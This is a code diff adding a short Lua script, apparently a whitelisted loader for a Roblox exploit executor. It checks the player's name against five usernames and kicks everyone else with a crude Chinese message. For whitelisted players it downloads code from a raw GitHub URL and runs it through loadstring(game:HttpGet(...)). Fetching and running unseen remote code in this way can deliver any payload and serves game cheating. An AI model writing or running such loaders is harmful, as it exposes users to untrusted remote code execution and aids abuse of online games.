@@ -1,0 +1,15 @@
+local m = {"lhdgkz","11742ww","aoskjjzbzbb","nojfohjsfk","nimasile987"}
+local LocalPlayerName = game:GetService("Players").LocalPlayer
+local Mode = false
+
+for k, v in pairs(m) do
+    if LocalPlayerName.Name == v then
+        Mode = true
+    end
+end
+
+if Mode then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopuLOVE/dajiba/refs/heads/main/%E4%B8%BB"))()
+    else
+    LocalPlayerName:Kick("没有白名单，你用个迪奥")
+end
